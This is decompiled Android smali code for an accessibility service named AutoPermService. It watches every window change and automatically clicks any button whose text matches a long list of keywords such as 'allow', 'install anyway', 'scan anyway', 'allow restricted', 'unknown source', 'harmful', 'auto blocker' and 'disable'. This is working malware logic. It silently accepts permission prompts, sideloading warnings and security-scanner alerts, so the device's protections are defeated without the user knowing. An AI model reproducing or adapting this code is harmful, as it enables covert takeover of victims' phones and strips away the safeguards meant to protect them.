.class public Lcom/axion/silent/AutoPermService;
.super Landroid/accessibilityservice/AccessibilityService;

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V
    return-void
.end method

.method public onServiceConnected()V
    .registers 4
    new-instance v0, Landroid/accessibilityservice/AccessibilityServiceInfo;
    invoke-direct {v0}, Landroid/accessibilityservice/AccessibilityServiceInfo;-><init>()V
    const v1, 0xFFFFFFFF
    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->eventTypes:I
    const/16 v1, 0x10
    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->feedbackType:I
    const v1, 0x50
    iput v1, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->flags:I
    const-wide/16 v2, 0x32
    iput-wide v2, v0, Landroid/accessibilityservice/AccessibilityServiceInfo;->notificationTimeout:J
    invoke-virtual {p0, v0}, Landroid/accessibilityservice/AccessibilityService;->setServiceInfo(Landroid/accessibilityservice/AccessibilityServiceInfo;)V
    return-void
.end method

.method public onInterrupt()V
    .registers 1
    return-void
.end method

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .registers 5
    if-eqz p1, :skip
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I
    move-result v0
    const v1, 0x20
    if-eq v0, v1, :act
    const v1, 0x800
    if-ne v0, v1, :skip
    :act
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;
    move-result-object v2
    if-eqz v2, :skip
    invoke-static {p0, v2}, Lcom/axion/silent/AutoPermService;->clickButtons(Landroid/content/Context;Landroid/view/accessibility/AccessibilityNodeInfo;)V
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :skip
    return-void
.end method

.method public static clickButtons(Landroid/content/Context;Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .registers 5
    if-eqz p1, :done
    const/4 v0, 0x0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I
    move-result v1
    :loop
    if-ge v0, v1, :check_self
    invoke-virtual {p1, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;
    move-result-object v2
    if-eqz v2, :next
    invoke-static {p0, v2}, Lcom/axion/silent/AutoPermService;->clickButtons(Landroid/content/Context;Landroid/view/accessibility/AccessibilityNodeInfo;)V
    invoke-virtual {v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :next
    add-int/lit8 v0, v0, 0x1
    goto :loop
    :check_self
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z
    move-result v2
    if-eqz v2, :done
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;
    move-result-object v3
    if-eqz v3, :done
    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;
    move-result-object v3
    invoke-virtual {v3}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;
    move-result-object v3
    invoke-static {v3}, Lcom/axion/silent/AutoPermService;->isBypassTarget(Ljava/lang/String;)Z
    move-result v2
    if-eqz v2, :done
    const/16 v2, 0x10
    invoke-virtual {p1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :done
    return-void
.end method

.method public static isBypassTarget(Ljava/lang/String;)Z
    .registers 3
    const/4 v0, 0x1

    const-string v1, "allow"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "install"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "continue"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "ok"
    invoke-virtual {p0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "done"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "got it"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "proceed"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "confirm"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "trust"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "accept"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "install anyway"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "scan anyway"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "send anyway"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "allow restricted"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "restricted setting"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "unknown source"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "not trusted"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "blocked"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "risk"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "ignore"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "still install"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "install now"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "permit"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "i understand"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "turn off"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "disable"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "allow from this source"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "sideload"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "unsafe app"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "harmful"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "auto blocker"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const-string v1, "not a problem"
    invoke-virtual {p0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
    move-result v2
    if-nez v2, :yes

    const/4 v0, 0x0
    :yes
    return v0
.end method
